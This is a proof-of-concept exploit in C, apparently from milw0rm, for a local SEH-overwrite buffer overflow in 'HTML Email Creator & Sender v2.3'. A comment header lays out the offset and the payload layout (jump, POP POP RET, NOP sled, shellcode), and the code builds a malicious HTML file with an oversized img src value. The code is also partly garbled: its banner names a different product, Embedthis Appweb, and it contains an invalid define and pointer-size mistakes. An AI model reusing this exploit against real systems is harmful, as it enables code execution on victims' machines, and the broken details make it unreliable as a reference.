    /*0day  HTML Email Creator & Sender v2.3 Local Buffer Overflow(Seh) Poc
    ********************************************************************
    Debugging info
    Seh handler is overwriten , the offset is at 60 bytes in our buffer 
    so you have to build your buffer as follows:
    [PONTER TO NEXT SEH]-------[SEH HANDLER]----[NOP]------[SHELLCODE]
              |                     |              |            |
            JMP 4 bytes            POP POP RET    50*0x90      calc.exe 
    *********************************************************************
    Code execution is possible.
    CPU Registers
    EAX 00000000
    ECX 00000208
    EDX 00000000
    EBX 00000029
    ESP 0012E224
    EBP 7C8101B1 kernel32.lstrcpynA
    ESI 90909090              <------------------CONTROLED
    EDI 00001209
    EIP 0042E1C7 HtmlEmai.0042E1C7
    */

    #include <stdio.h>
    #include <windows.h>
    #include <string.h>
    #include <getopt.h>
    #include <stdint.h>
    typedef struct Start  {
    uint8_t sh;
    uint8_t st;
    uint8_t sm;
    uint8_t sl;
                          }HTML;

    typedef struct Middle {
    uint8_t sh;
    uint8_t se;    
    uint8_t sa;                     
    uint8_t sd;
  	         	          }HEAD;
     
    typedef struct End    {
    uint8_t sb;
    uint8_t so;
    uint8_t sD;
    uint8_t sy;
                          }BODY;
    #define BUFFERSIZE  0x1A0A
    #define FILESIZE    29A
    #define SRC         "<img src="
    void Fbuild(char *fname)
    { HTML *ht_ml;
      HEAD *he_ad;
      BODY *bo_dy;
      char *memBuffer;
      //"\x48\x54\x4D\x4C"  -html
      ht_ml = (HTML*)malloc(sizeof(HTML));
      he_ad = (HEAD*)malloc(sizeof(HEAD));
      bo_dy = (BODY*)malloc(sizeof(BODY));
      memBuffer = (char*)malloc(BUFFERSIZE);
      if(ht_ml == NULL || he_ad == NULL || bo_dy == NULL || memBuffer == NULL) { 
      exit(-1);
                                                              } 
      ht_ml->sh = 0x48;
      ht_ml->st = 0x54;
      ht_ml->sm = 0x4D;
      ht_ml->sl = 0x4C;
      //second structure
      //HEAD "\x48\x45\x41\x44"
      he_ad->sh = 0x48;
      he_ad->se = 0x45;
      he_ad->sa = 0x41;
      he_ad->sd = 0x44;
      //thierd structure
      //"\x42\x4F\x44\x59"
      bo_dy->sb = 0x42;
      bo_dy->so = 0x4F;
      bo_dy->sD = 0x44;
      bo_dy->sy = 0x59;
      FILE *f;
      f = fopen(fname, "w");
      if( f == NULL) {
      exit(-1); 
                     }
      int32_t offset = 0;                    
      memcpy(memBuffer, "<", 1);  
      offset += 1;  
      memcpy(memBuffer+offset, ht_ml, sizeof(ht_ml));
      offset += sizeof(ht_ml);     
      memcpy(memBuffer+offset, ">", 1); 
      offset += 1;     
      memcpy(memBuffer+offset, "<", 1);
      offset += 1;          
      memcpy(memBuffer+offset, he_ad, sizeof(he_ad));
      offset += sizeof(he_ad);
      memcpy(memBuffer+offset, ">", 1); 
      offset += 1;
      memcpy(memBuffer+offset, "<", 1); 
      offset += 1;
      memcpy(memBuffer+offset, "\\", 1);
      offset += 1;
      memcpy(memBuffer+offset, he_ad, sizeof(he_ad)); 
      offset += sizeof(he_ad);
      memcpy(memBuffer+offset, ">", 1);
      offset += 1;
      memcpy(memBuffer+offset, "<", 1);
      offset += 1;
      memcpy(memBuffer+offset, bo_dy, sizeof(bo_dy));
      offset += sizeof(bo_dy);
      memcpy(memBuffer+offset, ">", 1);
      offset += 1;
      uint8_t shit[] ={ 0x3C,0x69,0x6D,0x67,0x20,0x73,0x72,0x63,0x3D };
      memcpy(memBuffer+offset, shit, sizeof(shit));
      offset += sizeof(shit);
      memset(memBuffer+offset, 0x22, 1);
      offset += 1;
      memset(memBuffer+offset, 0x41, 4616);
      offset += 4616;
      memset(memBuffer+offset, 0x22, 1);
      offset += 1;
      memcpy(memBuffer+offset, ">", 1);
      offset += 1;
      memcpy(memBuffer+offset, "<", 1);
      offset += 1;
      memcpy(memBuffer+offset, "\\", 1);
      offset += 1;
      memcpy(memBuffer+offset, bo_dy, sizeof(bo_dy));
      offset += sizeof(bo_dy);
      memcpy(memBuffer+offset, ">", 1);
      offset += 1;
      memcpy(memBuffer+offset, "<", 1); 
      offset += 1;
      memcpy(memBuffer+offset, "\\", 1);
      offset += 1;
      memcpy(memBuffer+offset, ht_ml, sizeof(ht_ml)); 
      offset += sizeof(ht_ml);
      memcpy(memBuffer+offset, ">", 1);  
      offset += 2; 
      fwrite(memBuffer, offset , 1, f); 
      fwrite("\x00", 1, 1, f);
      printf("File Done!\n");
    }
     int main(int argc, char *argv[])
    {  char *fname = argv[1];
       system("CLS"); 
       fprintf(stdout , "::                                         ::\n");
       fprintf(stdout , "Embedthis Appweb Remote Stack Overflow POC\n"); 
       fprintf(stdout , "All Credits:fl0 fl0w\n");
       fprintf(stdout , "::                                         ::\n");
       if(argc < 2) {
       printf("Usage is %s filename.html\n", argv[0]);               
       exit(-1);        
                    }       
       Fbuild(fname);
       return 0; 
     }  

// milw0rm.com [2009-08-18]